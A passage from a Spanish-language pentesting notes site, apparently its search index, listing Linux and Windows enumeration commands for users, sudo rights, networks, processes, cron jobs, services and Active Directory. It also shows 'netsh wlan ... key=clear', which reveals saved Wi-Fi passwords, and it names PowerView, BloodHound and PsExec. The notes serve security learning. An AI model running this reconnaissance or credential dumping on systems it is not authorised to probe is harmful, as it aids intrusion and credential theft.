</ul>"},{"location":"enumeration/linux-enumeration/#ver-permisos-de-un-usuario","title":"\ud83d\udd39 Ver Permisos de un Usuario","text":""},{"location":"enumeration/linux-enumeration/#5-listar-los-permisos-de-un-usuario","title":"5\ufe0f\u20e3 Listar los permisos de un usuario","text":"<pre><code>sudo -l -U &lt;usuario&gt;\n</code></pre> <p>\ud83d\udd39 Muestra qu\u00e9 comandos puede ejecutar el usuario con <code>sudo</code>.</p> <p>Ejemplo:</p> <pre><code>sudo -l -U juan\n</code></pre>"},{"location":"enumeration/linux-enumeration/#usuarios-y-grupos-administradores","title":"\ud83d\udd39 Usuarios y Grupos Administradores","text":""},{"location":"enumeration/linux-enumeration/#6-ver-quien-tiene-permisos-de-administrador","title":"6\ufe0f\u20e3 Ver qui\u00e9n tiene permisos de administrador","text":"<pre><code>getent group sudo\n</code></pre> <p>\ud83d\udd39 Muestra los usuarios con permisos de <code>sudo</code> en Debian/Ubuntu.</p> <pre><code>getent group wheel\n</code></pre> <p>\ud83d\udd39 Muestra los usuarios con permisos de <code>sudo</code> en CentOS/RHEL.</p> <pre><code>grep '^sudo\\|^wheel' /etc/group\n</code></pre> <p>\ud83d\udd39 Funciona en cualquier distribuci\u00f3n.</p>"},{"location":"enumeration/linux-enumeration/#buscar-usuarios-con-uid-y-gid-especificos","title":"\ud83d\udd39 Buscar Usuarios con UID y GID Espec\u00edficos","text":""},{"location":"enumeration/linux-enumeration/#7-listar-usuarios-con-uid-mayor-o-igual-a-1000-usuarios-normales","title":"7\ufe0f\u20e3 Listar usuarios con UID mayor o igual a 1000 (usuarios normales)","text":"<pre><code>awk -F':' '$3 &gt;= 1000 { print $1, $3 }' /etc/passwd\n</code></pre>"},{"location":"enumeration/linux-enumeration/#8-listar-usuarios-con-uid-0-root","title":"8\ufe0f\u20e3 Listar usuarios con UID 0 (root)","text":"<pre><code>awk -F':' '$3 == 0 { print $1 }' /etc/passwd\n</code></pre> <p>\ud83d\udd39 Si hay m\u00e1s de un usuario con UID 0, puede ser sospechoso.</p>"},{"location":"enumeration/linux-enumeration/#informacion-general-de-la-red","title":"\ud83d\udd39 Informaci\u00f3n General de la Red","text":"<p>Para enumerar informaci\u00f3n de red en Linux, puedes usar varios comandos dependiendo de lo que necesites. Aqu\u00ed te dejo los m\u00e1s importantes organizados por categor\u00eda:</p>"},{"location":"enumeration/linux-enumeration/#1-ver-interfaces-de-red-y-direcciones-ip","title":"1\ufe0f\u20e3 Ver interfaces de red y direcciones IP","text":"<pre><code>ip a\n</code></pre> <p>\ud83d\udd39 Muestra todas las interfaces de red con sus direcciones IP.</p> <pre><code>ifconfig\n</code></pre> <p>\ud83d\udd39 Alternativa antigua para ver interfaces de red (necesita instalar <code>net-tools</code>).</p> <pre><code>hostname -I\n</code></pre> <p>\ud83d\udd39 Muestra solo la direcci\u00f3n IP asignada al equipo.</p> <pre><code>ip r\n</code></pre> <p>\ud83d\udd39 Muestra la tabla de rutas del sistema.</p> <pre><code>ip link show\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n de las interfaces de red (estado y configuraci\u00f3n).</p>"},{"location":"enumeration/linux-enumeration/#configuracion-de-red-y-puertas-de-enlace","title":"\ud83d\udd39 Configuraci\u00f3n de Red y Puertas de Enlace","text":""},{"location":"enumeration/linux-enumeration/#2-ver-la-puerta-de-enlace-predeterminada","title":"2\ufe0f\u20e3 Ver la puerta de enlace predeterminada","text":"<pre><code>ip route show default\n</code></pre> <p>\ud83d\udd39 Muestra la puerta de enlace (gateway) del sistema.</p> <pre><code>route -n\n</code></pre> <p>\ud83d\udd39 Alternativa antigua para ver rutas y puertas de enlace.</p>"},{"location":"enumeration/linux-enumeration/#dns-y-servidores-de-nombres","title":"\ud83d\udd39 DNS y Servidores de Nombres","text":""},{"location":"enumeration/linux-enumeration/#3-ver-los-servidores-dns-configurados","title":"3\ufe0f\u20e3 Ver los servidores DNS configurados","text":"<pre><code>cat /etc/resolv.conf\n</code></pre> <p>\ud83d\udd39 Muestra los servidores DNS utilizados por el sistema.</p> <pre><code>systemd-resolve --status | grep 'DNS Servers'\n</code></pre> <p>\ud83d\udd39 En sistemas modernos con <code>systemd-resolved</code>, muestra los servidores DNS activos.</p>"},{"location":"enumeration/linux-enumeration/#conexiones-activas-y-puertos-abiertos","title":"\ud83d\udd39 Conexiones Activas y Puertos Abiertos","text":""},{"location":"enumeration/linux-enumeration/#4-ver-conexiones-activas-y-procesos-que-las-usan","title":"4\ufe0f\u20e3 Ver conexiones activas y procesos que las usan","text":"<pre><code>netstat -tulnp\n</code></pre> <p>\ud83d\udd39 Lista los puertos abiertos y qu\u00e9 procesos los est\u00e1n usando (requiere <code>net-tools</code>).</p> <pre><code>ss -tulnp\n</code></pre> <p>\ud83d\udd39 Alternativa moderna y m\u00e1s r\u00e1pida que <code>netstat</code>.</p> <pre><code>lsof -i\n</code></pre> <p>\ud83d\udd39 Lista los procesos que est\u00e1n usando la red.</p> <pre><code>iptables -L -n -v\n</code></pre> <p>\ud83d\udd39 Muestra las reglas del firewall <code>iptables</code>.</p> <pre><code>firewalld-cmd --list-all\n</code></pre> <p>\ud83d\udd39 En sistemas con <code>firewalld</code>, muestra reglas activas.</p>"},{"location":"enumeration/linux-enumeration/#escaneo-de-red-y-dispositivos-conectados","title":"\ud83d\udd39 Escaneo de Red y Dispositivos Conectados","text":""},{"location":"enumeration/linux-enumeration/#5-ver-dispositivos-en-la-misma-red","title":"5\ufe0f\u20e3 Ver dispositivos en la misma red","text":"<pre><code>arp -a\n</code></pre> <p>\ud83d\udd39 Muestra dispositivos conectados en la red local.</p> <pre><code>ip neigh show\n</code></pre> <p>\ud83d\udd39 Alternativa a <code>arp -a</code>, muestra la cach\u00e9 ARP.</p>"},{"location":"enumeration/linux-enumeration/#6-escanear-la-red-en-busca-de-dispositivos-activos","title":"6\ufe0f\u20e3 Escanear la red en busca de dispositivos activos","text":"<pre><code>nmap -sn 192.168.1.0/24\n</code></pre> <p>\ud83d\udd39 Escanea la red local para encontrar dispositivos activos (requiere <code>nmap</code>).</p> <pre><code>ping -c 4 192.168.1.1\n</code></pre> <p>\ud83d\udd39 Env\u00eda 4 paquetes <code>ping</code> a una direcci\u00f3n IP para verificar si responde.</p> <pre><code>traceroute google.com\n</code></pre> <p>\ud83d\udd39 Muestra la ruta de los paquetes hasta un destino.</p> <pre><code>mtr google.com\n</code></pre> <p>\ud83d\udd39 Alternativa interactiva y m\u00e1s detallada que <code>traceroute</code> (requiere <code>mtr</code>).</p>"},{"location":"enumeration/linux-enumeration/#wi-fi-y-redes-inalambricas","title":"\ud83d\udd39 Wi-Fi y Redes Inal\u00e1mbricas","text":""},{"location":"enumeration/linux-enumeration/#7-ver-redes-wi-fi-disponibles","title":"7\ufe0f\u20e3 Ver redes Wi-Fi disponibles","text":"<pre><code>nmcli dev wifi list\n</code></pre> <p>\ud83d\udd39 Muestra redes Wi-Fi cercanas (en sistemas con <code>NetworkManager</code>).</p> <pre><code>iwlist wlan0 scan\n</code></pre> <p>\ud83d\udd39 Muestra redes Wi-Fi disponibles (requiere permisos de root).</p> <pre><code>iwconfig\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n de la red inal\u00e1mbrica actual.</p>"},{"location":"enumeration/linux-enumeration/#analisis-de-trafico-de-red","title":"\ud83d\udd39 An\u00e1lisis de Tr\u00e1fico de Red","text":""},{"location":"enumeration/linux-enumeration/#8-capturar-paquetes-de-red","title":"8\ufe0f\u20e3 Capturar paquetes de red","text":"<pre><code>tcpdump -i eth0\n</code></pre> <p>\ud83d\udd39 Captura tr\u00e1fico en la interfaz <code>eth0</code> (requiere <code>tcpdump</code>).</p> <pre><code>tcpdump -i wlan0 port 80\n</code></pre> <p>\ud83d\udd39 Captura tr\u00e1fico HTTP en la interfaz Wi-Fi.</p> <pre><code>wireshark\n</code></pre> <p>\ud83d\udd39 Herramienta gr\u00e1fica para analizar tr\u00e1fico de red (requiere instalaci\u00f3n).</p>"},{"location":"enumeration/linux-enumeration/#enumerar-procesos-y-cron-jobs-en-linux","title":"\ud83d\udd39 Enumerar Procesos y Cron Jobs en Linux","text":""},{"location":"enumeration/linux-enumeration/#procesos-en-ejecucion","title":"\ud83d\udccc Procesos en Ejecuci\u00f3n","text":""},{"location":"enumeration/linux-enumeration/#1-ver-todos-los-procesos-activos","title":"1\ufe0f\u20e3 Ver todos los procesos activos","text":"<pre><code>ps aux\n</code></pre> <p>\ud83d\udd39 Lista todos los procesos con detalles como usuario, PID, uso de CPU y memoria.</p> <pre><code>ps -ef\n</code></pre> <p>\ud83d\udd39 Alternativa con formato diferente (muestra \u00e1rbol de procesos).</p> <pre><code>top\n</code></pre> <p>\ud83d\udd39 Monitoriza en tiempo real los procesos m\u00e1s activos.</p> <pre><code>htop\n</code></pre> <p>\ud83d\udd39 Versi\u00f3n mejorada de <code>top</code> (requiere instalaci\u00f3n: <code>sudo apt install htop</code>).</p>"},{"location":"enumeration/linux-enumeration/#2-buscar-un-proceso-especifico","title":"2\ufe0f\u20e3 Buscar un proceso espec\u00edfico","text":"<pre><code>ps aux | grep nombre_proceso\n</code></pre> <p>\ud83d\udd39 Filtra procesos por nombre.</p> <p>Ejemplo para buscar procesos de <code>nginx</code>:</p> <pre><code>ps aux | grep nginx\n</code></pre> <pre><code>pgrep -l nombre_proceso\n</code></pre> <p>\ud83d\udd39 Muestra solo los PIDs de un proceso espec\u00edfico.</p>"},{"location":"enumeration/linux-enumeration/#3-ver-procesos-de-un-usuario-en-especifico","title":"3\ufe0f\u20e3 Ver procesos de un usuario en espec\u00edfico","text":"<pre><code>ps -u usuario\n</code></pre> <p>\ud83d\udd39 Lista los procesos ejecutados por un usuario.</p>"},{"location":"enumeration/linux-enumeration/#4-ver-procesos-en-forma-de-arbol","title":"4\ufe0f\u20e3 Ver procesos en forma de \u00e1rbol","text":"<pre><code>pstree -p\n</code></pre> <p>\ud83d\udd39 Muestra procesos en estructura jer\u00e1rquica con sus PIDs.</p> <pre><code>ps -e --forest\n</code></pre> <p>\ud83d\udd39 Alternativa sin necesidad de instalar <code>pstree</code>.</p>"},{"location":"enumeration/linux-enumeration/#5-ver-procesos-que-consumen-mas-cpu-o-ram","title":"5\ufe0f\u20e3 Ver procesos que consumen m\u00e1s CPU o RAM","text":"<pre><code>ps aux --sort=-%cpu | head -10\n</code></pre> <p>\ud83d\udd39 Muestra los 10 procesos con mayor uso de CPU.</p> <pre><code>ps aux --sort=-%mem | head -10\n</code></pre> <p>\ud83d\udd39 Muestra los 10 procesos que m\u00e1s memoria est\u00e1n usando.</p>"},{"location":"enumeration/linux-enumeration/#6-matar-un-proceso","title":"6\ufe0f\u20e3 Matar un proceso","text":"<pre><code>kill PID\n</code></pre> <p>\ud83d\udd39 Mata un proceso usando su PID.</p> <pre><code>kill -9 PID\n</code></pre> <p>\ud83d\udd39 Mata un proceso forzadamente.</p> <pre><code>pkill nombre_proceso\n</code></pre> <p>\ud83d\udd39 Mata un proceso por su nombre.</p> <pre><code>killall nombre_proceso\n</code></pre> <p>\ud83d\udd39 Mata todos los procesos con el mismo nombre.</p>"},{"location":"enumeration/linux-enumeration/#enumerar-cron-jobs","title":"\ud83d\udccc Enumerar Cron Jobs","text":""},{"location":"enumeration/linux-enumeration/#7-ver-los-cron-jobs-de-un-usuario-especifico","title":"7\ufe0f\u20e3 Ver los cron jobs de un usuario espec\u00edfico","text":"<pre><code>crontab -l\n</code></pre> <p>\ud83d\udd39 Muestra las tareas programadas del usuario actual.</p> <pre><code>sudo crontab -l -u usuario\n</code></pre> <p>\ud83d\udd39 Muestra las tareas programadas de otro usuario.</p>"},{"location":"enumeration/linux-enumeration/#8-ver-los-cron-jobs-del-sistema","title":"8\ufe0f\u20e3 Ver los cron jobs del sistema","text":"<pre><code>ls -la /etc/cron.*\n</code></pre> <p>\ud83d\udd39 Muestra las carpetas donde se guardan los cron jobs del sistema.</p> <pre><code>cat /etc/crontab\n</code></pre> <p>\ud83d\udd39 Muestra el archivo <code>crontab</code> del sistema.</p> <pre><code>ls -l /var/spool/cron/crontabs/\n</code></pre> <p>\ud83d\udd39 Lista los archivos de cron job de cada usuario.</p>"},{"location":"enumeration/linux-enumeration/#9-ver-los-logs-de-cron-jobs","title":"9\ufe0f\u20e3 Ver los logs de cron jobs","text":"<pre><code>cat /var/log/syslog | grep CRON\n</code></pre> <p>\ud83d\udd39 En distribuciones como Ubuntu/Debian.</p> <pre><code>cat /var/log/cron\n</code></pre> <p>\ud83d\udd39 En sistemas basados en RHEL/CentOS.</p>"},{"location":"enumeration/windows-enumeration/","title":"Windows Enumeration","text":"<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <p>Sirve para listar las actualizaciones de Windows (hotfixes o parches) instaladas en el sistema.</p>"},{"location":"enumeration/windows-enumeration/#explicacion-de-cada-parte","title":"Explicaci\u00f3n de cada parte:","text":"<ul> <li><code>wmic</code> \u2192 Ejecuta la herramienta Windows Management Instrumentation Command-line (WMIC).</li> <li><code>qfe</code> \u2192 Se refiere a Quick Fix Engineering, que es el m\u00f3dulo que gestiona los parches del sistema.</li> <li><code>get</code> \u2192 Indica que queremos obtener informaci\u00f3n.</li> <li><code>Caption,Description,HotFixID,InstalledOn</code> \u2192 Especifica qu\u00e9 columnas de informaci\u00f3n mostrar:<ul> <li>Caption: Nombre descriptivo de la actualizaci\u00f3n.</li> <li>Description: Generalmente indica que es una \"Actualizaci\u00f3n de seguridad\".</li> <li>HotFixID: Identificador \u00fanico de la actualizaci\u00f3n (KBXXXXXX).</li> <li>InstalledOn: Fecha en que se instal\u00f3 el parche.</li> </ul> </li> </ul> <p>Para enumerar usuarios y grupos en Windows, puedes usar varios m\u00e9todos dependiendo del nivel de detalle que necesites. Aqu\u00ed te dejo algunas opciones con sus respectivos comandos.</p>"},{"location":"enumeration/windows-enumeration/#enumeracion-de-usuarios-en-windows","title":"\ud83d\udd39 Enumeraci\u00f3n de Usuarios en Windows","text":""},{"location":"enumeration/windows-enumeration/#1-ver-usuarios-locales-en-el-sistema","title":"1\ufe0f\u20e3 Ver usuarios locales en el sistema","text":"<pre><code>net user\n</code></pre> <p>\ud83d\udd39 Muestra todos los usuarios creados en el sistema.</p>"},{"location":"enumeration/windows-enumeration/#2-ver-detalles-de-un-usuario-especifico","title":"2\ufe0f\u20e3 Ver detalles de un usuario espec\u00edfico","text":"<pre><code>net user &lt;nombre_usuario&gt;\n</code></pre> <p>\ud83d\udd39 Sustituye <code>&lt;nombre_usuario&gt;</code> por el usuario que quieras consultar. \ud83d\udd39 Esto te dar\u00e1 informaci\u00f3n sobre grupos, permisos, fecha de \u00faltima conexi\u00f3n, etc.</p>"},{"location":"enumeration/windows-enumeration/#3-enumerar-usuarios-con-wmic","title":"3\ufe0f\u20e3 Enumerar usuarios con WMIC","text":"<pre><code>wmic useraccount get name,sid\n</code></pre> <p>\ud83d\udd39 Muestra el nombre y el Security Identifier (SID) de cada usuario.</p>"},{"location":"enumeration/windows-enumeration/#4-ver-usuarios-en-una-maquina-remota","title":"4\ufe0f\u20e3 Ver usuarios en una m\u00e1quina remota","text":"<pre><code>wmic /node:&lt;IP_o_NombreDelEquipo&gt; useraccount get name\n</code></pre> <p>\ud83d\udd39 \u00datil para auditor\u00edas en redes.</p>"},{"location":"enumeration/windows-enumeration/#enumeracion-de-grupos-en-windows","title":"\ud83d\udd39 Enumeraci\u00f3n de Grupos en Windows","text":""},{"location":"enumeration/windows-enumeration/#1-ver-todos-los-grupos-locales","title":"1\ufe0f\u20e3 Ver todos los grupos locales","text":"<pre><code>net localgroup\n</code></pre> <p>\ud83d\udd39 Muestra todos los grupos del sistema (como Administradores, Usuarios, Invitados, etc.).</p>"},{"location":"enumeration/windows-enumeration/#2-ver-usuarios-dentro-de-un-grupo-especifico","title":"2\ufe0f\u20e3 Ver usuarios dentro de un grupo espec\u00edfico","text":"<pre><code>net localgroup Administradores\n</code></pre> <p>\ud83d\udd39 Sustituye <code>Administradores</code> por otro grupo si necesitas informaci\u00f3n de otro.</p>"},{"location":"enumeration/windows-enumeration/#3-enumerar-grupos-con-wmic","title":"3\ufe0f\u20e3 Enumerar grupos con WMIC","text":"<pre><code>wmic group get name,sid\n</code></pre> <p>\ud83d\udd39 Muestra los nombres y SIDs de los grupos.</p>"},{"location":"enumeration/windows-enumeration/#enumeracion-de-usuarios-y-grupos-en-active-directory-si-estas-en-un-dominio","title":"\ud83d\udd39 Enumeraci\u00f3n de Usuarios y Grupos en Active Directory (si est\u00e1s en un dominio)","text":"<p>Si est\u00e1s en un dominio, puedes usar PowerShell.</p>"},{"location":"enumeration/windows-enumeration/#1-listar-todos-los-usuarios-de-active-directory","title":"1\ufe0f\u20e3 Listar todos los usuarios de Active Directory","text":"<pre><code>Get-ADUser -Filter * | Select Name,SamAccountName\n</code></pre> <p>\ud83d\udd39 Muestra los nombres de usuario en un entorno de dominio.</p>"},{"location":"enumeration/windows-enumeration/#2-ver-todos-los-grupos-de-active-directory","title":"2\ufe0f\u20e3 Ver todos los grupos de Active Directory","text":"<pre><code>Get-ADGroup -Filter * | Select Name\n</code></pre>"},{"location":"enumeration/windows-enumeration/#3-ver-los-miembros-de-un-grupo-en-active-directory","title":"3\ufe0f\u20e3 Ver los miembros de un grupo en Active Directory","text":"<pre><code>Get-ADGroupMember -Identity \"Administradores del dominio\"\n</code></pre>"},{"location":"enumeration/windows-enumeration/#enumeracion-con-herramientas-avanzadas","title":"\ud83d\udd39 Enumeraci\u00f3n con Herramientas Avanzadas","text":"<p>Si necesitas m\u00e1s herramientas avanzadas, puedes usar:</p> <ul> <li>PowerView (parte de PowerSploit) \u2192 para enumeraci\u00f3n en entornos de dominio.</li> <li>BloodHound \u2192 para analizar la estructura de permisos en redes Windows.</li> <li>PsExec \u2192 para ejecutar comandos remotamente.</li> </ul>"},{"location":"enumeration/windows-enumeration/#informacion-general-de-la-red","title":"\ud83d\udd39 Informaci\u00f3n general de la red","text":"<p>Para obtener informaci\u00f3n de la red en Windows, hay varios comandos que puedes usar dependiendo del nivel de detalle que necesites. Aqu\u00ed tienes una lista de los m\u00e1s \u00fatiles:</p>"},{"location":"enumeration/windows-enumeration/#1-ver-configuracion-de-red-ip-mascara-puerta-de-enlace-dns","title":"1\ufe0f\u20e3 Ver configuraci\u00f3n de red (IP, m\u00e1scara, puerta de enlace, DNS)","text":"<pre><code>ipconfig /all\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n completa sobre todas las interfaces de red del sistema, incluyendo direcciones IP, MAC, servidores DNS y DHCP.</p>"},{"location":"enumeration/windows-enumeration/#2-ver-interfaces-de-red-activas","title":"2\ufe0f\u20e3 Ver interfaces de red activas","text":"<pre><code>ipconfig\n</code></pre> <p>\ud83d\udd39 Muestra solo las interfaces con conexi\u00f3n activa.</p>"},{"location":"enumeration/windows-enumeration/#3-mostrar-tabla-de-enrutamiento","title":"3\ufe0f\u20e3 Mostrar tabla de enrutamiento","text":"<pre><code>route print\n</code></pre> <p>\ud83d\udd39 Muestra las rutas disponibles en el sistema, \u00fatil para analizar tr\u00e1fico de red y posibles configuraciones incorrectas.</p>"},{"location":"enumeration/windows-enumeration/#4-ver-conexiones-de-red-y-puertos-abiertos","title":"4\ufe0f\u20e3 Ver conexiones de red y puertos abiertos","text":"<pre><code>netstat -ano\n</code></pre> <p>\ud83d\udd39 Muestra todas las conexiones activas, los puertos abiertos y los PID de los procesos que los est\u00e1n usando.</p> <p>Opciones \u00fatiles:</p> <ul> <li><code>netstat -an</code> \u2192 Muestra conexiones activas con direcciones IP y puertos.</li> <li><code>netstat -ano</code> \u2192 Incluye el PID de los procesos que est\u00e1n usando cada conexi\u00f3n.</li> <li><code>netstat -r</code> \u2192 Muestra la tabla de enrutamiento.</li> <li><code>netstat -s</code> \u2192 Muestra estad\u00edsticas de paquetes enviados y recibidos.</li> </ul>"},{"location":"enumeration/windows-enumeration/#escaneo-y-analisis-de-red","title":"\ud83d\udd39 Escaneo y an\u00e1lisis de red","text":""},{"location":"enumeration/windows-enumeration/#5-ver-equipos-en-la-misma-red-con-netbios","title":"5\ufe0f\u20e3 Ver equipos en la misma red (con NetBIOS)","text":"<pre><code>nbtstat -n\n</code></pre> <p>\ud83d\udd39 Muestra los nombres NetBIOS registrados en el sistema.</p> <pre><code>nbtstat -A &lt;IP&gt;\n</code></pre> <p>\ud83d\udd39 Consulta el nombre NetBIOS de un equipo en la red.</p> <pre><code>net view\n</code></pre> <p>\ud83d\udd39 Lista los equipos accesibles en la red local.</p>"},{"location":"enumeration/windows-enumeration/#6-hacer-ping-a-un-dispositivo-para-verificar-conectividad","title":"6\ufe0f\u20e3 Hacer ping a un dispositivo para verificar conectividad","text":"<pre><code>ping &lt;IP_o_Dominio&gt;\n</code></pre> <p>\ud83d\udd39 Env\u00eda paquetes ICMP para comprobar si un host est\u00e1 accesible.</p> <pre><code>ping -t &lt;IP&gt;\n</code></pre> <p>\ud83d\udd39 Hace ping continuo hasta que se detenga manualmente (<code>Ctrl + C</code>).</p>"},{"location":"enumeration/windows-enumeration/#7-rastrear-la-ruta-a-un-host","title":"7\ufe0f\u20e3 Rastrear la ruta a un host","text":"<pre><code>tracert &lt;IP_o_Dominio&gt;\n</code></pre> <p>\ud83d\udd39 Muestra los nodos intermedios por los que pasa un paquete antes de llegar a su destino.</p>"},{"location":"enumeration/windows-enumeration/#8-escaneo-de-puertos-abiertos-en-un-host","title":"8\ufe0f\u20e3 Escaneo de puertos abiertos en un host","text":"<pre><code>netstat -an | find \"LISTENING\"\n</code></pre> <p>\ud83d\udd39 Muestra solo los puertos que est\u00e1n en estado LISTENING.</p> <pre><code>powershell Test-NetConnection -ComputerName &lt;IP_o_Dominio&gt; -Port &lt;N\u00fameroPuerto&gt;\n</code></pre> <p>\ud83d\udd39 Verifica si un puerto est\u00e1 abierto en un equipo remoto.</p>"},{"location":"enumeration/windows-enumeration/#9-obtener-informacion-sobre-la-direccion-mac-y-el-fabricante","title":"9\ufe0f\u20e3 Obtener informaci\u00f3n sobre la direcci\u00f3n MAC y el fabricante","text":"<pre><code>getmac /v /fo list\n</code></pre> <p>\ud83d\udd39 Muestra las direcciones MAC de todas las interfaces.</p> <pre><code>arp -a\n</code></pre> <p>\ud83d\udd39 Muestra la tabla ARP con direcciones IP y MAC de los dispositivos conectados.</p>"},{"location":"enumeration/windows-enumeration/#informacion-de-redes-wi-fi","title":"\ud83d\udd39 Informaci\u00f3n de redes Wi-Fi","text":""},{"location":"enumeration/windows-enumeration/#ver-redes-wi-fi-guardadas","title":"\ud83d\udd1f Ver redes Wi-Fi guardadas","text":"<pre><code>netsh wlan show profiles\n</code></pre> <p>\ud83d\udd39 Lista todas las redes Wi-Fi a las que se ha conectado el equipo.</p> <pre><code>netsh wlan show profile name=\"&lt;SSID&gt;\" key=clear\n</code></pre> <p>\ud83d\udd39 Muestra los detalles de una red Wi-Fi espec\u00edfica, incluyendo la clave de seguridad en texto plano.</p>"},{"location":"enumeration/windows-enumeration/#escaneo-avanzado-con-herramientas","title":"\ud83d\udd39 Escaneo avanzado con herramientas","text":"<p>Si necesitas algo m\u00e1s avanzado, puedes usar:</p> <ul> <li>Nmap \u2192 Para escanear redes y descubrir dispositivos.</li> <li>Wireshark \u2192 Para capturar y analizar paquetes de red.</li> <li>PowerView \u2192 Para enumeraci\u00f3n en entornos de dominio.</li> </ul>"},{"location":"enumeration/windows-enumeration/#procesos-en-ejecucion","title":"\ud83d\udd39 Procesos en ejecuci\u00f3n","text":"<p>Para enumerar procesos y servicios en Windows, puedes usar diferentes comandos seg\u00fan el nivel de detalle que necesites. Aqu\u00ed tienes las opciones m\u00e1s \u00fatiles:</p>"},{"location":"enumeration/windows-enumeration/#1-listar-todos-los-procesos-activos","title":"1\ufe0f\u20e3 Listar todos los procesos activos","text":"<pre><code>tasklist\n</code></pre> <p>\ud83d\udd39 Muestra una lista de procesos con su PID (Process ID), uso de memoria y nombre del ejecutable.</p> <pre><code>tasklist /svc\n</code></pre> <p>\ud83d\udd39 Muestra los procesos junto con los servicios que est\u00e1n ejecutando.</p> <pre><code>tasklist /fi \"imagename eq notepad.exe\"\n</code></pre> <p>\ud83d\udd39 Filtra los procesos por nombre (ejemplo: <code>notepad.exe</code>).</p> <pre><code>tasklist /fi \"pid eq 1234\"\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n del proceso con el ID <code>1234</code>.</p>"},{"location":"enumeration/windows-enumeration/#2-ver-detalles-avanzados-de-un-proceso","title":"2\ufe0f\u20e3 Ver detalles avanzados de un proceso","text":"<pre><code>wmic process list full\n</code></pre> <p>\ud83d\udd39 Muestra informaci\u00f3n detallada de todos los procesos en ejecuci\u00f3n.</p> <pre><code>wmic process where name=\"chrome.exe\" get ProcessId,ParentProcessId,CommandLine\n</code></pre> <p>\ud83d\udd39 Muestra el PID, el proceso padre y la l\u00ednea de comando con la que se inici\u00f3 un proceso espec\u00edfico (<code>chrome.exe</code> en este caso).</p>"},{"location":"enumeration/windows-enumeration/#3-terminar-un-proceso","title":"3\ufe0f\u20e3 Terminar un proceso","text":"<pre><code>taskkill /PID 1234 /F\n</code></pre> <p>\ud83d\udd39 Mata el proceso con el ID <code>1234</code>.</p> <pre><code>taskkill /IM notepad.exe /F\n</code></pre> <p>\ud83d\udd39 Mata todos los procesos con el nombre <code>notepad.exe</code>.</p>"},{"location":"enumeration/windows-enumeration/#servicios-en-windows","title":"\ud83d\udd39 Servicios en Windows","text":""},{"location":"enumeration/windows-enumeration/#4-listar-servicios-en-ejecucion","title":"4\ufe0f\u20e3 Listar servicios en ejecuci\u00f3n","text":"<pre><code>net start\n</code></pre> <p>\ud83d\udd39 Muestra una lista de servicios que est\u00e1n en ejecuci\u00f3n.</p> <pre><code>wmic service get Name,DisplayName,State\n</code></pre> <p>\ud83d\udd39 Muestra los servicios junto con su nombre y estado (Running o Stopped).</p>"},{"location":"enumeration/windows-enumeration/#5-ver-detalles-de-un-servicio-especifico","title":"5\ufe0f\u20e3 Ver detalles de un servicio espec\u00edfico","text":"<pre><code>sc query &lt;NombreDelServicio&gt;\n</code></pre> <p>\ud83d\udd39 Sustituye <code>&lt;NombreDelServicio&gt;</code> por el nombre real del servicio.</p> <p>Ejemplo para el servicio de Windows Update:</p> <pre><code>sc query wuauserv\n</code></pre>"},{"location":"enumeration/windows-enumeration/#6-iniciar-o-detener-un-servicio","title":"6\ufe0f\u20e3 Iniciar o detener un servicio","text":"<pre><code>sc start &lt;NombreDelServicio&gt;\n</code></pre> <p>\ud83d\udd39 Inicia un servicio.</p> <pre><code>sc stop &lt;NombreDelServicio&gt;\n</code></pre> <p>\ud83d\udd39 Detiene un servicio.</p> <p>Ejemplo:</p> <pre><code>sc start wuauserv\nsc stop wuauserv\n</code></pre>"},{"location":"enumeration/windows-enumeration/#7-obtener-la-configuracion-completa-de-un-servicio","title":"7\ufe0f\u20e3 Obtener la configuraci\u00f3n completa de un servicio","text":"<pre><code>sc qc &lt;NombreDelServicio&gt;\n</code></pre> <p>\ud83d\udd39 Muestra el binario que ejecuta el servicio, tipo de inicio, permisos, etc.</p> <p>Ejemplo:</p> <pre><code>sc qc Spooler\n</code></pre>"},{"location":"enumeration/windows-enumeration/#8-ver-servicios-en-un-equipo-remoto","title":"8\ufe0f\u20e3 Ver servicios en un equipo remoto","text":"<pre><code>sc \\\\&lt;IP_o_NombreDelEquipo&gt; query\n</code></pre> <p>\ud83d\udd39 Lista los servicios en un equipo remoto.</p>"},{"location":"enumeration/windows-enumeration/#monitoreo-avanzado-con-powershell","title":"\ud83d\udd39 Monitoreo avanzado con PowerShell","text":""},{"location":"enumeration/windows-enumeration/#9-ver-procesos-en-ejecucion","title":"9\ufe0f\u20e3 Ver procesos en ejecuci\u00f3n","text":"<pre><code>Get-Process\n</code></pre> <p>\ud83d\udd39 Muestra los procesos en ejecuci\u00f3n con detalles como uso de memoria y CPU.</p> <pre><code>Get-Process | Where-Object { $_.ProcessName -like \"*chrome*\" }\n</code></pre> <p>\ud83d\udd39 Filtra los procesos por nombre.</p>"},{"location":"enumeration/windows-enumeration/#listar-servicios-y-su-estado","title":"\ud83d\udd1f Listar servicios y su estado","text":"<pre><code>Get-Service\n</code></pre> <p>\ud83d\udd39 Muestra todos los servicios con su estado (Running o Stopped).</p> <pre><code>Get-Service -Name Spooler\n</code></pre> <p>\ud83d\udd39 Muestra detalles del servicio <code>Spooler</code>.</p>"},{"location":"enumeration/windows-enumeration/#herramientas-avanzadas","title":"\ud83d\ude80 Herramientas avanzadas","text":"<p>Si quieres algo m\u00e1s gr\u00e1fico o detallado:</p> <ul> <li>Process Explorer \u2192 Alternativa avanzada al Administrador de Tareas.</li> <li>Process Hacker \u2192 Para ver detalles avanzados de procesos y servicios.</li> <li>Autoruns \u2192 Para analizar programas que se inician con el sistema.</li> </ul>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/","title":"Nmap Scripting Engine (NSE)","text":""},{"location":"footprinting-and-scanning/nmap-scripting-engine/#que-es-nse-nmap-scripting-engine","title":"\ud83d\udd0e \u00bfQu\u00e9 es NSE (Nmap Scripting Engine)?","text":"<p>NSE (Nmap Scripting Engine) es un motor de scripting integrado en Nmap que permite automatizar tareas avanzadas durante los escaneos. Utiliza scripts escritos en Lua para detectar vulnerabilidades, obtener informaci\u00f3n detallada de servicios y realizar auditor\u00edas de seguridad m\u00e1s profundas.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#para-que-sirve-nse","title":"\ud83d\udee0\ufe0f \u00bfPara qu\u00e9 sirve NSE?","text":"<p>\u2705 Detecci\u00f3n de vulnerabilidades (Ej: identificar servicios desactualizados o con exploits conocidos). 